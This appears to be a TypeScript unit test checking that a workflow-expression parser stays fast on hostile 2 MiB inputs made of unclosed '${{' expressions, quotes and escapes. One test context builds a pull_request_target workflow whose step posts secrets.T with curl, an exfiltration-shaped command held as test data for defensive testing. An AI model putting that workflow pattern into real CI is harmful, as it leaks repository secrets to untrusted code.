test("multi-line expressions: hostile 2 MiB lines and files of expressions, quotes and escapes stay linear", () => {
  const N = 2 * 1024 * 1024;
  const fill = (unit: string) => unit.repeat(Math.ceil(N / unit.length)).slice(0, N);
  // On one line, and on many: an expression opened and never closed, opened on every line, closed and opened again.
  const units = ["${{ ", "${{ '", "${{ }}", "}}", "${{ \\x73 }} ", "\\x24{{ ", "\\u0024", "\\U0000007b", "\\", "\\\\", "''", "'", '\\"', "${{\n", "${{ '\n", "}} ${{\n", "}} ${{ toJSON(\n", "secrets) }} ${{\n", "#${{\n", "${{ # '\n", "x\n", " ", " .", "[ ", "\x85", "${{ secrets ", "${{ github.event.pull_request \n"];
  const contexts = [
    (p: string) => `k: "${p}"\n`,
    (p: string) => `k: '${p}'\n`,
    (p: string) => `k: ${p}\n`,
    (p: string) => `k: |\n  ${p.replaceAll("\n", "\n  ")}\n`,
    (p: string) => `k: "${p}\\\n  x"\n`,
    (p: string) => `on: [pull_request_target]\njobs:\n  a:\n    steps:\n      - run: curl -d "$T" ${p.replaceAll("\n", "\n          ")}\n        env:\n          T: \${{\n            secrets.T }}\n`,
  ];
  for (const u of units) {
    for (const [ci, ctx] of contexts.entries()) {
      const t0 = performance.now();
      wf(ctx(fill(u)));
      const ms = performance.now() - t0;
      assert.ok(ms < LIMIT_MS, `unit ${JSON.stringify(u)} in context ${ci} took ${ms.toFixed(0)} ms`);
    }
  }
});
